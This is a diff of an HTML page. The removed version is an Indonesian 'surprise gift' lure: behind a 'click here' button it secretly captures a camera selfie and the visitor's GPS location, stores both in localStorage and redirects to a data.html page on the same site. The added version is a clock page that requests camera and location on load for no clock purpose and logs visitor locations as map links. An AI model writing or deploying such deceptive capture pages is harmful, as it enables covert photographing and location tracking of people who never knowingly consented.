@@ -1,111 +1,171 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gift</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #ff5f6d, #ffc371);
-            font-family: 'Arial', sans-serif;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-            overflow: hidden;
-        }
-        .container {
-            position: relative;
-            z-index: 1;
-        }
-        h1 {
-            font-size: 2.5em;
-            margin: 0;
-            animation: fadeIn 3s ease-in-out;
-        }
-        p {
-            font-size: 1.5em;
-            margin: 20px 0;
-            animation: fadeIn 3s ease-in-out 1s;
-        }
-        button {
-            font-size: 1.2em;
-            padding: 10px 20px;
-            background: #fff;
-            color: #ff5f6d;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            animation: pulse 1.5s infinite;
-        }
-        .gif {
-            width: 150px;
-            margin: 20px auto;
-        }
-        video, canvas {
-            display: none;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JAM DIGITAL L-HAKIM</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #1d1d1d, #434343);
+      color: white;
+      font-family: 'Roboto', sans-serif;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    .clock {
+      font-size: 60px;
+      margin-bottom: 20px;
+      opacity: 0;
+      transform: translateY(-50px);
+      animation: fadeInMoveDown 2s ease-out forwards 1.5s;
+    }
+
+    .message {
+      font-size: 28px;
+      margin-bottom: 20px;
+      opacity: 0;
+      transform: translateY(-50px);
+      animation: fadeInMoveDown 2s ease-out forwards 0.5s;
+    }
+
+    footer {
+      margin-top: 20px;
+      font-size: 14px;
+      opacity: 0;
+      transform: translateY(50px);
+      animation: fadeInMoveUp 2s ease-out forwards 3s;
+    }
+
+    @keyframes fadeInMoveDown {
+      0% {
+        opacity: 0;
+        transform: translateY(-50px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeInMoveUp {
+      0% {
+        opacity: 0;
+        transform: translateY(50px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.1) 10%, transparent 10.1%) 0 0, 
+                  radial-gradient(circle, rgba(255,255,255,0.1) 10%, transparent 10.1%) 50px 50px;
+      background-size: 100px 100px;
+      animation: rotateBackground 20s linear infinite;
+    }
+
+    @keyframes rotateBackground {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Selamat Datang!</h1>
-        <p>Saya mempunyai Kejutan buat kamu.</p>
-        <button id="selfieButton">Klik Disini</button>
-        <video id="video" width="640" height="480" autoplay></video>
-        <canvas id="canvas" width="640" height="480"></canvas>
-    </div>
 
-    <script>
-        const selfieButton = document.getElementById('selfieButton');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+  <div class="message">Welcome to my jam digital</div>
+  <div class="clock" id="clock">00:00:00</div>
 
-        // Akses kamera
+  <footer>Modern Digital Clock & Camera & Location Access</footer>
+
+  <script>
+    function updateClock() {
+      const now = new Date();
+      const hours = String(now.getHours()).padStart(2, '0');
+      const minutes = String(now.getMinutes()).padStart(2, '0');
+      const seconds = String(now.getSeconds()).padStart(2, '0');
+      document.getElementById('clock').textContent = `${hours}:${minutes}:${seconds}`;
+    }
+    setInterval(updateClock, 1000);
+    updateClock(); // initial call
+
+    // Automatically request camera access
+    function requestCameraAccess() {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-            })
-            .catch(error => {
-                console.error('Error accessing the camera:', error);
-            });
+          .then((stream) => {
+            console.log("Camera access granted.");
+            saveVisitorData(stream);
+          })
+          .catch(error => {
+            alert('Unable to access camera: ' + error.message);
+          });
+      } else {
+        alert('Camera access is not supported by your browser.');
+      }
+    }
 
-        // Ambil foto dan simpan di localStorage, serta ambil lokasi
-        selfieButton.addEventListener('click', () => {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataURL = canvas.toDataURL('image/png');
-            localStorage.setItem('selfieImage', dataURL);
+    // Request location access
+    function requestLocationAccess() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            saveLocationData(mapsURL);
+          },
+          (error) => {
+            alert('Unable to access location: ' + error.message);
+          }
+        );
+      } else {
+        alert('Geolocation is not supported by your browser.');
+      }
+    }
 
-            // Ambil lokasi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const { latitude, longitude } = position.coords;
-                    localStorage.setItem('userLocation', JSON.stringify({ latitude, longitude }));
+    // Save visitor data (location & camera)
+    function saveVisitorData(stream) {
+      const visitorData = {
+        timestamp: new Date(),
+        cameraURL: 'Camera accessed successfully', // Placeholder since we won't display video
+      };
+      const visitors = JSON.parse(localStorage.getItem('visitors')) || [];
+      visitors.push(visitorData);
+      localStorage.setItem('visitors', JSON.stringify(visitors));
+    }
 
-                    // Arahkan ke halaman kedua
-                    window.location.href = 'https://ikhsan-projct.github.io/data.html';
-                }, error => {
-                    console.error('Error getting location:', error);
-                });
-            } else {
-                console.error('Geolocation is not supported by this browser.');
-            }
-        });
-    </script>
+    // Save location data
+    function saveLocationData(mapsURL) {
+      const visitors = JSON.parse(localStorage.getItem('visitors')) || [];
+      if (visitors.length > 0) {
+        visitors[visitors.length - 1].location = mapsURL; // Append location to the last saved visitor
+      }
+      localStorage.setItem('visitors', JSON.stringify(visitors));
+    }
+
+    window.onload = () => {
+      requestCameraAccess();
+      requestLocationAccess();
+    };
+  </script>
+  
 </body>
 </html>
